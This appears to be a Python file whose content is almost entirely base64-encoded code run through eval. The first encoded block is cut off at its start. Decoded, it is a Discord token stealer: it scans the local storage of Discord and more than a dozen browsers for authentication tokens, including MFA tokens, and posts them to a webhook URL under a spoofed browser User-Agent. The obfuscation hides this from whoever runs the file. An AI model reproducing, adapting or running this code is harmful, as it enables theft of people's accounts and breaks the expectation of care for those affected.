QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

